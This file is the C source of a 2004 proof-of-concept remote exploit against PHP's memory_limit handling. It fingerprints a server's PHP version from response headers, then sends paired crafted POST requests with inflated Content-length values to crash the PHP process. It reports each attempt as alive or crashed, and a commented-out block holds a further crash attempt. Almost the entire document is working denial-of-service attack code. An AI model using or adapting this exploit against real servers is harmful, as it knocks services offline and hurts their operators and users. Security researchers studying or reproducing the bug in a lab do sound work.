/* 
 * php memory_limit remote POC
 * Makes sigsegv without sending big amount of traffic.
 * Programmed by h0snp.
 * July, 2004.
 */
  
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>

#define PHP_FILE "/a.php"
#define HOST "127.0.0.1"
 
void usage(char* name)
{
	printf("usage: %s \n",name);
	exit(0);
}

unsigned long int resolve(char *host)
{
	 long i;
	 struct hostent *he;
	 
	 i = inet_addr(host);
	 if (i < 0) 
	 {
	 	he = gethostbyname(host);
	 	if (!he) return (0);
      	 else           return (*(unsigned long *)he->h_addr);      	
  	 }
   	return (i);
}
 
int make_connect(char *address, unsigned short port)
{
	int sock,i;
	struct sockaddr_in peer;
	
	sock = socket(AF_INET,SOCK_STREAM,0);
	if ((i = resolve(address))) 
		{
			peer.sin_family = AF_INET;
    		peer.sin_addr.s_addr = i;
			peer.sin_port = htons(port);
		}		
	if (!(connect(sock,(struct sockaddr *)&peer,sizeof peer))) return (sock);
		else { close(sock);  }
		
	printf("\n <-> failed to connect...\n"); 
	exit(-1); 
}

#define PGB_SZ   4096
#define VAR_SZ   512
#define VULN_OK  0
#define PATCHED  -1
#define DEF_ML   8388608

char           pg_buf[PGB_SZ];
unsigned char *get_req  = "GET %s HTTP/1.1\r\n"
					      "Host: %s\r\n"
					      "Connection: close\r\n"
					      "\r\n\r\n\x00";
unsigned char *post_req = "POST %s HTTP/1.1\r\n"
					      "Host: %s\r\n" 
					      "Content-length: %ld\r\n\r\n"
					      "yo=m00-ownz-you&v1=%s&v2=%s\r\n\r\n\x00";

short check_vuln(char* host,char* phpfile, unsigned short port, unsigned short nconn,short hard,long limit)
{
	int   sock,sock2,ret = PATCHED;
	int   err,i,v1=0,v2=0,v3=0;
	char  stat[30],ext[30],*p;
	
	printf(" <+> cheking host %s:%d, assuming memory_limit is set to %ld\n",host,port,limit); 
	memset(pg_buf,0,PGB_SZ);
	memset(ext,0,30);
	snprintf(pg_buf,PGB_SZ,get_req,phpfile,host);
	
	sock = make_connect(host,port);	
	err = send(sock,pg_buf,strlen(pg_buf),0);
	if (!err)  
		{ 	printf("\n <-> failed to send...\n"); exit(-1); }
	err = recv(sock,pg_buf,PGB_SZ,0);
	if (!err)  
		{ 	printf("\n <-> failed to recv...\n"); exit(-1); }
	pg_buf[err-1] = 0;
	sscanf(pg_buf,"HTTP/1.1 %d",&err);
    if (err!=200) 
		{	printf("   <-> php file not found or invalid (%d). provide another one...\n",err); exit(-1);} else
 	        printf("   <+> ok. php file found.\n");		
	p = strstr(pg_buf,"PHP");
	if (!p) printf("   <?> server's PHP version is UNKNOWN. \n"); else
	{
		sscanf(p,"PHP/%d.%d.%d-%5s ",&v1,&v2,&v3,ext);					
		if (v1 <= 4 && v2 <= 3 && v3 <= 7) 
			{
				printf("   <+> server reported: PHP/%d.%d.%d%5s - %s",v1,v2,v3,ext,"VULNERABLE.\n");
				ret = VULN_OK;
			}
			else
				printf("   <+> server reported: PHP/%d.%d.%d%5s - %s",v1,v2,v3,ext,"NOT vulnerable.\n");
	}
	memset(stat,'-',30);
	stat[nconn] = 0x0;
	close(sock);
	if (!hard) return ret;
	for (i=0; i<nconn; i++)
	{
		memset(pg_buf,0,PGB_SZ);
		snprintf(pg_buf,PGB_SZ,post_req,phpfile,host,DEF_ML-10000,"A","B");
		
		sock = make_connect(host,port);
		err = send(sock,pg_buf,strlen(pg_buf),0);
		if (!err)  { printf("\n <-> failed to send...\n"); exit(-1); }
		sleep(3);
		memset(pg_buf,0,PGB_SZ);
		snprintf(pg_buf,PGB_SZ,post_req,phpfile,host,DEF_ML+1000000,"A","B");
		sock2 = make_connect(host,port);
		err = send(sock2,pg_buf,strlen(pg_buf),0);
		//printf("-------------\n%s\n----------------\n",pg_buf);
		//exit(0);
		if (!err)  { printf("\n <-> failed to send...\n"); exit(-1); }
		err = recv(sock2,pg_buf,PGB_SZ,0);
		if (err)
		{			
			stat[i] = 'A';
			printf("\r       progress: [%s] %3.0f%% A - ALIVE, C - CRASH",stat, (((float)(i+1)/nconn)*100));
		} else
		{
			stat[i] = 'C';
			ret     = VULN_OK;
			printf("\r       progress: [%s] %3.0f%% A - ALIVE, C - CRASH",stat,(((float)(i+1)/nconn)*100));				
		}
		fflush(stdout);
		close(sock);
		close(sock2);
	}	
	printf("\n");	
	return ret;	
}


int main(int argc, char* argv[])
{	
	int   		    err;
	int   		    sock,sock2;
	char 		   *host=HOST, *phpfile=PHP_FILE;
	unsigned short  port=80;
	char  		    var1[VAR_SZ],var2[VAR_SZ];
	
	err = check_vuln(host,phpfile,80,12,1,DEF_ML);
/*
	memset(pg_buf,0,PGB_SZ);
	memset(var1,0x41,VAR_SZ);
	memset(var2,0x42,VAR_SZ);
	snprintf(pg_buf,PGB_SZ,post_req,phpfile,host,22+VAR_SZ*2,var1,var2);
	sock = make_connect(host,port);
	err = send(sock,pg_buf,strlen(pg_buf),0);
	if (!err)  { printf("\n <-> failed to send...\n"); exit(-1); }
	memset(pg_buf,0,PGB_SZ);
	snprintf(pg_buf,PGB_SZ,post_req,phpfile,host,22+VAR_SZ*2,var1,var2);
	sock2 = make_connect(host,port);
	err = send(sock2,pg_buf,strlen(pg_buf),0);
	if (!err)  { printf("\n <-> failed to send...\n"); exit(-1); }
	err = recv(sock2,pg_buf,PGB_SZ,0);
	if (!err) printf("CRASHED!!!"); else printf("ALIVE!!!"); 
		fflush(stdout);
	close(sock);
	close(sock2);*/
	return 0; 
 }
